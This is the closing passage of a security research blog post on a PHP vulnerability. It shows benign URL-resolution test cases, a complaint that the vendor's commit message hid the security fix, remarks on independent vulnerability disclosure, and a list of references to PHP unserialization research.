            'scheme' => ['https://ex.com', 'http://ex.com', 'https://ex.com'],
            'schema-less' => ['//ex.com', 'https://baz.com', 'https://ex.com'],
            'bad scheme' => ['bad://ex.com', 'http://ex.com', ''],
            'bad scheme 2' => ['foo', 'bad://ex.com', ''],
            '..' => ['../foo', 'http://ex.com/bar/baz', 'http://ex.com/bar/foo'],
            '.. 2' => ['../foo', 'http://ex.com/bar/baz/', 'http://ex.com/bar/foo'],
            '../..' => ['../../foo', 'http://ex.com/bar/baz', 'http://ex.com/foo'],
        ];

```

Also, I might add that the comment message is nice:

![No mention of security fixes in the commit message](/assets/images/old-school-pwning-with-new-school-tricks/commit-message-vanilla.png "No mention of security fixes in the commit message")

This certainly doesn’t describe what the real issue is now does it?

### Conclusion

Over the years I have learned that it’s pretty important to stay independent when reporting vulnerabilities. There are sometimes cases such as these when the vendor either obscures, hides or plain right lies about the details and this type of behavior typically happens on bug bounty platforms where the vendors are favored.

Please note though, I clearly distinguish between product oriented and service oriented bug bounties. There is no way that users of a website or service need to be notified of technical details related to security issues as the code is not impacting them directly. They should only ever be notified if a breach has taken place and their IP has been released to third parties inadvertently as a result of that breach.

### References

* [https://raw.githubusercontent.com/s-n-t/presentations/master/us-18-Thomas-It’s-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It.pdf](https://raw.githubusercontent.com/s-n-t/presentations/master/us-18-Thomas-It%27s-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It.pdf)
* <https://blog.ripstech.com/2018/new-php-exploitation-technique/>
* <https://rdot.org/forum/showthread.php?t=4379>

* [pgp key](/assets/5B1183EE04FD7FFE68BE48E264AE09A98432FB9B.asc.txt)

* [sourceincite](https://github.com/sourceincite)
* [sourceincite](https://twitter.com/sourceincite)

* [![The Creative Commons License](/assets/Creative-Commons-License.png)](https://creativecommons.org/licenses/by-nc/4.0/)
* copyright © 2014 - 2024 Source Incite

[![W3C Compliant](/assets/images/valid-html40.png)](http://validator.w3.org/check?uri=referer)

The content of this site is licensed under a [Creative Commons Attribution-Non‑Commercial 4.0 International License.](https://creativecommons.org/licenses/by-nc/4.0/)


